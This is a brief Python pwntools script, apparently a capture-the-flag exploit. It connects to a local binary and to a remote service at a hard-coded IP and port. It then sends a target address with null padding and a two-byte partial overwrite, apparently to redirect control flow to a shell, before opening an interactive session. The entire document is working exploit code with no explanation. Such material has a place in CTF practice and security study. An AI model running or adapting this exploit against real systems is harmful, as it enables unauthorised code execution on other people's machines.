from pwn import*
p = process('./main')
p = remote('183.129.189.60',10083)
def m(address,content):
	p.sendafter('addr',address)
	p.sendafter('data:',content)
m(p64(0x404028) + '\x00'*0xC0,'\x4A\x12')
p.interactive()
